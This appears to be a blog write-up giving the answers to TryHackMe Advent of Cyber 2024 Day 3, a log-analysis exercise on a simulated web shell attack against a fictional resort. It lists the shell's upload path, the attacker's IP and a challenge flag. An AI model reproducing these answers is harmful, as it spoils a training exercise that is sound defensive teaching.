+<p>To review the logs of the attack on Frosty Pines Resorts, make sure you select the “<strong>frostypines-resorts</strong>” collection within ELK. Such as below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731408603792.png" alt="selecting the frostypines-resorts collection within ELK" /></p>
+
+<p>The date and time that you will need to use when reviewing logs will be <strong>between 11:30 and 12:00 on October 3rd 2024.</strong></p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731406589164.png" alt="Highlighting the necessary time and date range within ELK for the blue element of the practical." /></p>
+
+<p>Please note you will need to add <code class="language-plaintext highlighter-rouge">MACHINE_IP frostypines.thm</code> to your host’s file to access the hotel management system web app.</p>
+
+<p>Answer the questions below</p>
+
+<p>:::tip
+<strong>BLUE</strong>: Where was the web shell uploaded to?</p>
+
+<p>:::</p>
+
+<p><strong>Answer format:</strong> /directory/directory/directory/filename.php</p>
+
+<p>==/media/images/rooms/shell.php==</p>
+
+<p>:::tip
+<strong>BLUE</strong>: What IP address accessed the web shell?</p>
+
+<p>:::</p>
+
+<p>==10.11.83.34==</p>
+
+<p>:::tip
+<strong>RED</strong>: What is the contents of the flag.txt?</p>
+
+<p>:::</p>
+
+<p>==THM{Gl1tch_Was_H3r3}==</p>
+
+<p>If you liked today’s task, you can learn how to harness the power of <a href="https://tryhackme.com/jr/advancedelkqueries">advanced ELK queries</a>.</p>
+
+
+  </article>
+  
+    <div class="post-share">
+  <div class="post-date">Feel free to share!</div>
+  <div class="sharing-icons">
+    <a href="https://twitter.com/intent/tweet?text=Try Hack Me Advent of Cyber - Day 3&amp;url=/Day3" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    <a href="https://www.facebook.com/sharer/sharer.php?u=/Day3&amp;title=Try Hack Me Advent of Cyber - Day 3" target="_blank"><i class="fa fa-facebook" aria-hidden="true"></i></a>
+  </div>
+</div>
+
+  
+  
+    <div class="related">
+  <h2>You may also enjoy...</h2>
+  
+  <ul class="related-posts">
+    
+      
+        
+          <li>
+            <h3>
+              <a href="/Day7">
+                <div class="related-thumbnail">
+                  
+                    <img src="http://localhost:4000/assets/img/Day7-logo.png">
+                  
+                </div>
+                <div class="related-title">
+                  Try Hackme Advent of Cyber - Day 7
+                </div>
+                <!--<small>December 7, 2024</small>-->
+              </a>
+            </h3>
+          </li>
+          
+        
+      
+        
+          <li>
+            <h3>
+              <a href="/Day6">
+                <div class="related-thumbnail">
+                  
+                    <img src="http://localhost:4000/assets/img/Day6-logo.png">
+                  
+                </div>
+                <div class="related-title">
+                  Try Hackme Advent of Cyber - Day 6
+                </div>
+                <!--<small>December 6, 2024</small>-->
+              </a>
+            </h3>
+          </li>
+          
+        
+      
+    
+      
+        
+        
+      
+        
+        
+      
+    
+  </ul>
+</div>
+
+  
+  
+    <section class="disqus">
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+    var disqus_shortname = "millennial-3";
+    var disqus_identifier = "/Day3";
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+
+  
+</div>
+
+      </div>
+      <footer class="footer">
+  
+    <a href="https://twitter.com/mberger" class="menu-link" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+  
+    <a href="feed.xml" class="menu-link" target="_blank"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
+  
+  <div class="footer-description"><a href="/">THM Advent of Cyber 2024 | a minimalist Jekyll theme for running a blog or publication by Michael</a></div>
+</footer>
+
+    </div>
+  </body>
+</html>
